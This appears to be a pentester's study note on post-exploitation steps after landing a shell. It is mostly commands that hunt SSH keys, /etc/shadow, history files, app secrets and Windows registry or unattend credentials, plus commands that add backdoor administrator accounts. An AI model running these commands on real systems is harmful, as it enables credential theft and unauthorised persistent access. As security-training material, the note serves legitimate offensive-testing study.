---
title: "Post-Shell Actions"
created: 2026-03-11
updated: 2026-11-16
type: technique
tags: [technique, exploitation, shells, post-exploitation]
---

# Post-Shell Actions

What to do immediately after landing a shell — credential hunting, persistence, and account creation.

---

## Linux: Credential Hunting

### SSH keys

```bash
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
ls -la /home/*/.ssh/
```

If you find a private key, copy it to your machine and use it directly:

```bash
chmod 600 id_rsa
ssh -i id_rsa user@target
```

### Readable password files

```bash
cat /etc/shadow          # hashes — needs root or misconfigured permissions
cat /etc/passwd          # check for password hashes in field 2 (old systems)
```

A writable `/etc/passwd` or `/etc/shadow` lets you add your own user or replace a hash.

### Credentials in files

```bash
grep -ri "password" /home/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "password" /opt/ 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
cat /var/www/html/wp-config.php     # WordPress DB creds
cat /var/www/html/.env              # Laravel/Node app secrets
```

### History files

```bash
cat /home/*/.bash_history
cat /root/.bash_history
cat /home/*/.mysql_history
```

---

## Windows: Credential Hunting

### Registry passwords

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKLM\SOFTWARE\RealVNC" /s
```

VNC servers frequently store passwords in the registry in plaintext or weak encoding.

### Service credentials in files

```cmd
type "C:\Program Files\FileZilla Server\FileZilla Server.xml"
type "C:\xampp\FileZilla Server\FileZilla Server.xml"
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\unattended.xml
```

FileZilla credentials may be plaintext or MD5 depending on version. Unattend files contain deployment passwords (often base64-encoded, not encrypted).

### Saved credentials

```cmd
cmdkey /list
runas /savecred /user:admin cmd.exe
```

---

## Creating a Persistent Account

When you have SYSTEM or admin-level access and need a way back in:

### Linux

```bash
useradd -m -s /bin/bash newuser
echo 'newuser:password123' | chpasswd
usermod -aG sudo newuser
```

### Windows

```cmd
net user newuser password123 /add
net localgroup administrators newuser /add
```

Then connect via RDP, WinRM, SSH, or any remote access service running on the box.

---

## Upgrading Access

| Current Access | Next Step |
|---------------|-----------|
| Web shell (www-data) | Reverse shell → find privesc vector |
| Low-privilege shell | Hunt credentials, check sudo -l, SUID binaries |
| Local admin / root | Dump hashes, create accounts, pivot to other hosts |
| SSH keys found | Direct SSH login — more stable than a reverse shell |

---

## Related Notes

- [[Shells and Listeners]] — getting and stabilising a shell
- [[Web Shells]] — upgrading web shell to reverse shell
- [[Meterpreter]] — automated credential harvesting (hashdump, kiwi)
